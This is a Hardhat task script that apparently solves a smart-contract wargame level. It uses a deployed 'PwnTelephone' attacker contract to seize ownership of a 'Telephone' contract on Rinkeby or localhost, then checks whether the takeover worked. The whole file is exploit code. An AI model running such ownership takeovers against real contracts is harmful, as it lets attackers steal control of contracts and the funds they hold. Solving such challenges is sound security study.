import { task } from 'hardhat/config';
import { ContractReceipt, ContractTransaction } from 'ethers';
import { Telephone, PwnTelephone } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_PWN } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import telephoneAbi from '../../data/abi/Telephone.json';
import pwnAbi from '../../data/abi/PwnTelephone.json';

task(TASK_PWN, 'Break this contract')
  .setAction(async (_taskArgs, hre) => {

    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const userWallet = wallets[1];

    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    let contractAddress = '';
    let pwnContractAddress = '';
    if (network.name === 'rinkeby') {
      contractAddress = process.env.RINKEBY_TELEPHONE_CONTRACT_ADDRESS || '';
      pwnContractAddress = process.env.RINKEBY_PWNTELEPHONE_CONTRACT_ADDRESS || '';
    } else if (network.name === 'unknown') { //localhost network
      contractAddress = process.env.LOCALHOST_TELEPHONE_CONTRACT_ADDRESS || '';
      pwnContractAddress = process.env.LOCALHOST_PWNTELEPHONE_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${contractAddress}`);

    const telephoneContract: Telephone = new hre.ethers.Contract(contractAddress, telephoneAbi, userWallet) as Telephone;
    const pwnTelephoneContract: PwnTelephone = new hre.ethers.Contract(pwnContractAddress, pwnAbi, userWallet) as PwnTelephone;

    // Show Previous Owner
    const prevOwner: string = await telephoneContract.owner();
    console.log(`Prev owner: ${prevOwner}`);

    // Change Owner
    const changeOwnerTx: ContractTransaction = await pwnTelephoneContract.connect(userWallet)
      .changeOwner(userWallet.address, { gasLimit: 150000 });

    const contractReceipt: ContractReceipt = await changeOwnerTx.wait();

    if (contractReceipt.status === 1) {
      console.log("Change Owner Successful");
    } else {
      console.log('Change Owner Failed');
    }

     // Get New Owner
    const newOwner: string = await telephoneContract.owner();
    console.log(`New owner: ${newOwner}`);

    if (newOwner === userWallet.address) {
      console.log("Claim ownership success");
    } else {
      console.log('Claim ownership failed');
    }

    process.exit(0)
  });